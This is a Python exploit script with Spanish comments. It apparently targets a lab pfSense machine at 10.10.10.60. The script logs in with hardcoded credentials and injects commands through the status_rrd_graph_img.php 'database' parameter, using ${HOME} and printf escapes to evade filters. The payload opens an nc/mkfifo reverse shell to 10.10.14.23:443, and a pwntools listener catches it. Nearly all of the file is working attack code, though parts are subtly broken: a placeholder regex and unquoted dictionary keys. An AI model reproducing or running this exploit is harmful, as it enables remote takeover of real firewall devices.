from pwn import *
import pdb, requests, signal, sys, urllib3, time, re, threading

def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"
rce_url = """https://10.10.10.60/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.23 443 >${HOME}tmp${HOME}f"""
lport = 443

def executeCommand():

	#crea una sesion
	s = requests.session()
	#deshabilita el warining del certificado autofirmado -> https
	urllib3.disable_warnings() 
	s.verify = False

	#tramita una peticion
    r = s.get(main_url)
	#obtenemos el csrfToken con una expresion regular
	csrfToken = re.findall(r'<cadena>', r.text)[0]

	#definimos la data que vamos a tramitar
	post_data = {
		csrftoken: csrfToken,
        usernamefld: "rohit",
        passwordfld: "pfsense",
        login: "Login"
	}
	#mandamos la data, con la cual nos vamos a loguear
	r = s.post(main_url, data=post_data)
	#atentamos contra el RCE
	r = s.get(rce_url)
	

if __name__ == "__main__":

	try:
		# declaramos la funcion que necesitamos paralelizar
		threading.Thread(target=executeCommand, args=()).start()
	except Exception as e:
		#mostramos el error en formato string con pwntools
		log.error(str(e))

	#nos ponemos en escucha, de manera paralela, se ejecuta la funcion de arriba.
	shell = listen(lport, timeout=20).wait_for_connection()
	#invocamos una shell interactiva
	shell.interactive()
